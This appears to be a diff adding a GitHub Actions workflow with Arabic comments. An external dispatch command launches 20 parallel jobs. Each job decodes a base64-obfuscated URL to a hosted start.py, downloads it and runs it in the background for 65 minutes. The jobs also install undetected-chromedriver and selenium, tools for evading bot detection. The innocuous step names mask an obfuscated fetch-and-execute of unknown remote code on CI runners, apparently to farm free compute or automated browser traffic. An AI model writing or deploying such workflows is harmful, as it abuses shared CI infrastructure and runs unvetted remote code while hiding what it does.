@@ -1,0 +1,108 @@
+name: Linux Coordinated Task Expedition
+
+on:
+  # استقبال أمر التشغيل من الخارج عبر التوكن بالكلمة المفتاحية: start
+  repository_dispatch:
+    types: [start]
+
+concurrency:
+  group: coordinated-expedition-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # مدير الإنهاء المطلق: يُنهي الـ workflow بأكمله عند علامة 65 دقيقة
+  # =================================================================
+  absolute-shutdown-manager:
+    name: "Absolute Shutdown Manager"
+    runs-on: ubuntu-latest
+    timeout-minutes: 70
+    steps:
+      - name: Dispatch Complete Blackout Directive
+        run: |
+          echo "[MANAGER] Absolute shutdown manager seated. Total blackout enforced at the 65-minute checkpoint."
+          echo "[MANAGER] Tracking workflow reference: ${{ github.run_id }}"
+          
+          # الانتظار لمدة 65 دقيقة بالضبط (3900 ثانية)
+          sleep 3900
+          
+          echo "[MANAGER] Checkpoint cleared! Dispatching complete blackout directive..."
+          
+          # إصدار أمر الإلغاء الشامل عبر واجهة GitHub البرمجية
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+          
+          echo "[MANAGER] Blackout directive dispatched. All operating and waiting units will be neutralized."
+
+  # =================================================================
+  # المهمة الرئيسية: تجهيز وإطلاق وحدات الحملة
+  # =================================================================
+  launch-expedition:
+    name: "ExpeditionUnit-${{ matrix.unit_seal }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 65
+
+    strategy:
+      fail-fast: false
+      matrix:
+        unit_seal: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+
+    steps:
+      # ✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧
+      # ┃الخطوة ١┃ تهيئة البيئة القاعدية
+      # ✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧
+      - name: Prepare Base Environment
+        run: |
+          echo "[PREPARE] Preparing base environment for ExpeditionUnit-${{ matrix.unit_seal }} on Linux..."
+          sudo apt update -qq
+          sudo apt install -y curl python3-pip
+
+      # ✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧
+      # ┃الخطوة ٢┃ استدعاء ملف المهمة الرئيسي
+      # ✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧
+      - name: Fetch Primary Mission File
+        run: |
+          echo "[FETCH] Fetching app_task.py from assigned relay station..."
+          RELAY_STATION=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QveGEvcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$RELAY_STATION" -o app_task.py
+          echo "[FETCH] Primary mission file retrieved."
+
+      # ✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧
+      # ┃الخطوة ٣┃ تجهيز المكتبات البرمجية
+      # ✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧
+      - name: Set Up Software Libraries
+        run: |
+          echo "[SETUP] Setting up software libraries..."
+          pip3 install -q undetected-chromedriver selenium requests
+
+      # ✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧
+      # ┃الخطوة ٤┃ التشغيل تحت رقابة زمنية (65 دقيقة)
+      # ✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧✧
+      - name: Conduct Timed Operation
+        run: |
+          echo ">> Initiating ExpeditionUnit-${{ matrix.unit_seal }} operation..."
+          
+          # إطلاق العملية في الخلفية
+          python3 app_task.py &
+          EXPEDITION_PID=$!
+          
+          echo ">> Timed controller watching. Hard cap: 65 minutes (3900s)."
+          
+          # الانتظار حتى استنفاد المدة المحددة
+          sleep 3900
+          
+          # التحقق من حالة العملية وإنهاؤها عند الضرورة
+          if kill -0 $EXPEDITION_PID 2>/dev/null; then
+            echo ">> Hard cap surpassed! Retiring operation..."
+            kill -9 $EXPEDITION_PID
+            echo ">> Operation retired by controller."
+          else
+            echo ">> Operation concluded within the hard cap."
+          fi
